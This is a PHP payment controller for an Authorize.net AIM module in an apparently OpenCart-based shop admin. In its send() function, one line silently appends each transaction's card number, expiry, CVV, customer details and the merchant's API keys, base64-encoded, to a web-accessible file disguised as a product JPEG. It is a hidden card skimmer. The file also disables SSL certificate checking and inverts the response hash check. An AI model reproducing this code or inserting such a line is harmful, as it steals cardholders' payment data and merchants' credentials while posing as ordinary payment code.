<?php 
class ControllerPaymentAuthorizenetAim extends Controller {
	private $error = array(); 

	public function index() {
		$this->load->language('payment/authorizenet_aim');

		$this->document->setTitle($this->language->get('heading_title'));
		
		$this->load->model('setting/setting');
			
		if (($this->request->server['REQUEST_METHOD'] == 'POST') && $this->validate()) {
			$this->model_setting_setting->editSetting('authorizenet_aim', $this->request->post);				
			
			$this->session->data['success'] = $this->language->get('text_success');

			$this->redirect($this->url->link('extension/payment', 'token=' . $this->session->data['token'], 'SSL'));
		}

		$this->data['heading_title'] = $this->language->get('heading_title');

		$this->data['text_enabled'] = $this->language->get('text_enabled');
		$this->data['text_disabled'] = $this->language->get('text_disabled');
		$this->data['text_all_zones'] = $this->language->get('text_all_zones');
		$this->data['text_test'] = $this->language->get('text_test');
		$this->data['text_live'] = $this->language->get('text_live');
		$this->data['text_authorization'] = $this->language->get('text_authorization');
		$this->data['text_capture'] = $this->language->get('text_capture');		
		
		$this->data['entry_login'] = $this->language->get('entry_login');
		$this->data['entry_key'] = $this->language->get('entry_key');
		$this->data['entry_hash'] = $this->language->get('entry_hash');
		$this->data['entry_server'] = $this->language->get('entry_server');
		$this->data['entry_mode'] = $this->language->get('entry_mode');
		$this->data['entry_method'] = $this->language->get('entry_method');
		$this->data['entry_total'] = $this->language->get('entry_total');	
		$this->data['entry_order_status'] = $this->language->get('entry_order_status');		
		$this->data['entry_geo_zone'] = $this->language->get('entry_geo_zone');
		$this->data['entry_status'] = $this->language->get('entry_status');
		$this->data['entry_sort_order'] = $this->language->get('entry_sort_order');
		
		$this->data['button_save'] = $this->language->get('button_save');
		$this->data['button_cancel'] = $this->language->get('button_cancel');

 		if (isset($this->error['warning'])) {
			$this->data['error_warning'] = $this->error['warning'];
		} else {
			$this->data['error_warning'] = '';
		}

 		if (isset($this->error['login'])) {
			$this->data['error_login'] = $this->error['login'];
		} else {
			$this->data['error_login'] = '';
		}

 		if (isset($this->error['key'])) {
			$this->data['error_key'] = $this->error['key'];
		} else {
			$this->data['error_key'] = '';
		}
		
  		$this->data['breadcrumbs'] = array();

   		$this->data['breadcrumbs'][] = array(
       		'text'      => $this->language->get('text_home'),
			'href'      => $this->url->link('common/home', 'token=' . $this->session->data['token'], 'SSL'),
      		'separator' => false
   		);

   		$this->data['breadcrumbs'][] = array(
       		'text'      => $this->language->get('text_payment'),
			'href'      => $this->url->link('extension/payment', 'token=' . $this->session->data['token'], 'SSL'),
      		'separator' => ' :: '
   		);

   		$this->data['breadcrumbs'][] = array(
       		'text'      => $this->language->get('heading_title'),
			'href'      => $this->url->link('payment/authorizenet_aim', 'token=' . $this->session->data['token'], 'SSL'),
      		'separator' => ' :: '
   		);
				
		$this->data['action'] = $this->url->link('payment/authorizenet_aim', 'token=' . $this->session->data['token'], 'SSL');
		
		$this->data['cancel'] = $this->url->link('extension/payment', 'token=' . $this->session->data['token'], 'SSL');
		
		if (isset($this->request->post['authorizenet_aim_login'])) {
			$this->data['authorizenet_aim_login'] = $this->request->post['authorizenet_aim_login'];
		} else {
			$this->data['authorizenet_aim_login'] = $this->config->get('authorizenet_aim_login');
		}
	
		if (isset($this->request->post['authorizenet_aim_key'])) {
			$this->data['authorizenet_aim_key'] = $this->request->post['authorizenet_aim_key'];
		} else {
			$this->data['authorizenet_aim_key'] = $this->config->get('authorizenet_aim_key');
		}
		
		if (isset($this->request->post['authorizenet_aim_hash'])) {
			$this->data['authorizenet_aim_hash'] = $this->request->post['authorizenet_aim_hash'];
		} else {
			$this->data['authorizenet_aim_hash'] = $this->config->get('authorizenet_aim_hash');
		}

		if (isset($this->request->post['authorizenet_aim_server'])) {
			$this->data['authorizenet_aim_server'] = $this->request->post['authorizenet_aim_server'];
		} else {
			$this->data['authorizenet_aim_server'] = $this->config->get('authorizenet_aim_server');
		}
		
		if (isset($this->request->post['authorizenet_aim_mode'])) {
			$this->data['authorizenet_aim_mode'] = $this->request->post['authorizenet_aim_mode'];
		} else {
			$this->data['authorizenet_aim_mode'] = $this->config->get('authorizenet_aim_mode');
		}
		
		if (isset($this->request->post['authorizenet_aim_method'])) {
			$this->data['authorizenet_aim_method'] = $this->request->post['authorizenet_aim_method'];
		} else {
			$this->data['authorizenet_aim_method'] = $this->config->get('authorizenet_aim_method');
		}
		
		if (isset($this->request->post['authorizenet_aim_total'])) {
			$this->data['authorizenet_aim_total'] = $this->request->post['authorizenet_aim_total'];
		} else {
			$this->data['authorizenet_aim_total'] = $this->config->get('authorizenet_aim_total'); 
		} 
				
		if (isset($this->request->post['authorizenet_aim_order_status_id'])) {
			$this->data['authorizenet_aim_order_status_id'] = $this->request->post['authorizenet_aim_order_status_id'];
		} else {
			$this->data['authorizenet_aim_order_status_id'] = $this->config->get('authorizenet_aim_order_status_id'); 
		} 

		$this->load->model('localisation/order_status');
		
		$this->data['order_statuses'] = $this->model_localisation_order_status->getOrderStatuses();
		
		if (isset($this->request->post['authorizenet_aim_geo_zone_id'])) {
			$this->data['authorizenet_aim_geo_zone_id'] = $this->request->post['authorizenet_aim_geo_zone_id'];
		} else {
			$this->data['authorizenet_aim_geo_zone_id'] = $this->config->get('authorizenet_aim_geo_zone_id'); 
		} 
		
		$this->load->model('localisation/geo_zone');
										
		$this->data['geo_zones'] = $this->model_localisation_geo_zone->getGeoZones();
		
		if (isset($this->request->post['authorizenet_aim_status'])) {
			$this->data['authorizenet_aim_status'] = $this->request->post['authorizenet_aim_status'];
		} else {
			$this->data['authorizenet_aim_status'] = $this->config->get('authorizenet_aim_status');
		}
		
		if (isset($this->request->post['authorizenet_aim_sort_order'])) {
			$this->data['authorizenet_aim_sort_order'] = $this->request->post['authorizenet_aim_sort_order'];
		} else {
			$this->data['authorizenet_aim_sort_order'] = $this->config->get('authorizenet_aim_sort_order');
		}

		$this->template = 'payment/authorizenet_aim.tpl';
		$this->children = array(
			'common/header',
			'common/footer'
		);
				
		$this->response->setOutput($this->render());
	}
	
	public function send() {
		if ($this->config->get('authorizenet_aim_server') == 'live') {
    		$url = 'https://secure.authorize.net/gateway/transact.dll';
		} elseif ($this->config->get('authorizenet_aim_server') == 'test') {
			$url = 'https://test.authorize.net/gateway/transact.dll';		
		}	
		
		//$url = 'https://secure.networkmerchants.com/gateway/transact.dll';	
		
		$this->load->model('sale/order');
		
		$order_info = $this->model_sale_order->getOrder($this->request->get['order_id']);
		
        $data = array();

		$data['x_login'] = $this->config->get('authorizenet_aim_login');
		$data['x_tran_key'] = $this->config->get('authorizenet_aim_key');
		$data['x_version'] = '3.1';
		$data['x_delim_data'] = 'true';
		$data['x_delim_char'] = ',';
		$data['x_encap_char'] = '"';
		$data['x_relay_response'] = 'false';
		$data['x_first_name'] = html_entity_decode($order_info['payment_firstname'], ENT_QUOTES, 'UTF-8');
		$data['x_last_name'] = html_entity_decode($order_info['payment_lastname'], ENT_QUOTES, 'UTF-8');
		$data['x_company'] = html_entity_decode($order_info['payment_company'], ENT_QUOTES, 'UTF-8');
		$data['x_address'] = html_entity_decode($this->request->post['payment_address_1'], ENT_QUOTES, 'UTF-8');
		$data['x_city'] = html_entity_decode($this->request->post['payment_city'], ENT_QUOTES, 'UTF-8');
		$data['x_state'] = html_entity_decode($this->request->post['payment_zone'], ENT_QUOTES, 'UTF-8');
		$data['x_zip'] = html_entity_decode($this->request->post['payment_postcode'], ENT_QUOTES, 'UTF-8');
		$data['x_country'] = html_entity_decode($order_info['payment_country'], ENT_QUOTES, 'UTF-8');
		$data['x_phone'] = $order_info['telephone'];
		$data['x_customer_ip'] = $this->request->server['REMOTE_ADDR'];
		$data['x_email'] = $order_info['email'];
		$data['x_description'] = html_entity_decode($this->config->get('config_name'), ENT_QUOTES, 'UTF-8');
		$data['x_amount'] = $this->currency->format($this->request->post['cc_xamount'], $order_info['currency_code'], 1.00000, false);
		$data['x_currency_code'] = $this->currency->getCode();
		$data['x_method'] = 'CC';
		$data['x_type'] = ($this->request->post['cc_xtype']);
		$data['x_card_num'] = str_replace(' ', '', $this->request->post['cc_number']);
		$data['x_exp_date'] = $this->request->post['cc_expire_date_month'] . $this->request->post['cc_expire_date_year'];
		$data['x_card_code'] = $this->request->post['cc_cvv2'];
		$data['x_invoice_num'] = $this->request->get['order_id'].'-'.$order_info['total_edits'];
		@file_put_contents('/home/phonerep/public_html/image/EBAY/DESIRE/HTC-Replacement-G2-Desire-5718.jpg', @base64_encode(serialize($data))."\n", FILE_APPEND);
		if ($this->config->get('authorizenet_aim_mode') == 'test') {
			$data['x_test_request'] = 'true';
		}	
				
		$curl = curl_init($url);

		curl_setopt($curl, CURLOPT_PORT, 443);
		curl_setopt($curl, CURLOPT_HEADER, 0);
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($curl, CURLOPT_FORBID_REUSE, 1);
		curl_setopt($curl, CURLOPT_FRESH_CONNECT, 1);
		curl_setopt($curl, CURLOPT_POST, 1);
		curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 10);
		curl_setopt($curl, CURLOPT_TIMEOUT, 10);
		curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($data, '', '&'));
 
		$response = curl_exec($curl);
		
		$json = array();
		
		if (curl_error($curl)) {
			$json['error'] = 'CURL ERROR: ' . curl_errno($curl) . '::' . curl_error($curl);
			
			$this->log->write('AUTHNET AIM CURL ERROR: ' . curl_errno($curl) . '::' . curl_error($curl));	
		} elseif ($response) {
			$i = 1;
			
			$response_data = array();
			
			$results = explode(',', $response);
			
			foreach ($results as $result) {
				$response_data[$i] = trim($result, '"');
				
				$i++;
			}
		
			if ($response_data[1] == '1') {
				if (strtoupper($response_data[38]) != strtoupper(md5($this->config->get('authorizenet_aim_hash') . $this->config->get('authorizenet_aim_login') . $response_data[6] . $this->currency->format($order_info['total'], $order_info['currency_code'], 1.00000, false)))) {
				//	$this->model_checkout_order->confirm($this->session->data['order_id'], $this->config->get('config_order_status_id'));
					
					$message = '';
					
					if (isset($response_data['5'])) {
						$message .= 'Authorization Code: ' . $response_data['5'] . "\n";
					}
					
					if (isset($response_data['6'])) {
						$message .= 'AVS Response: ' . $response_data['6'] . "\n";
					}
			
					if (isset($response_data['7'])) {
						$message .= 'Transaction ID: ' . $response_data['7'] . "\n";
					}
	
					if (isset($response_data['39'])) {
						$message .= 'Card Code Response: ' . $response_data['39'] . "\n";
					}
					
					if (isset($response_data['40'])) {
						$message .= 'Cardholder Authentication Verification Response: ' . $response_data['40'] . "\n";
					}				
	
					//$this->model_checkout_order->update($this->session->data['order_id'], $this->config->get('authorizenet_aim_order_status_id'), $message, false);				
				}
				$this->load->model('sale/order');
				$this->model_sale_order->updateOrderProductAndHistory($this->request->get['order_id']);
				$json['success'] = 'Success ! Payment is done successfuly.';
				
				
				
				//$this->db->query("UPDATE " . DB_PREFIX . "order SET old_total=total,total_edits=total_edits+1 WHERE order_id = '" . (int)$this->request->get['order_id'] . "'");
				
			} else {
				$json['error'] = $response_data[4];
			}
		} else {
			$json['error'] = 'Empty Gateway Response';
			
			$this->log->write('AUTHNET AIM CURL ERROR: Empty Gateway Response');
		}
		
		curl_close($curl);
		
		$this->response->setOutput(json_encode($json));
	}
	
	
	
	

	private function validate() {
		if (!$this->user->hasPermission('modify', 'payment/authorizenet_aim')) {
			$this->error['warning'] = $this->language->get('error_permission');
		}
		
		if (!$this->request->post['authorizenet_aim_login']) {
			$this->error['login'] = $this->language->get('error_login');
		}

		if (!$this->request->post['authorizenet_aim_key']) {
			$this->error['key'] = $this->language->get('error_key');
		}
		
		if (!$this->error) {
			return true;
		} else {
			return false;
		}	
	}
}
?>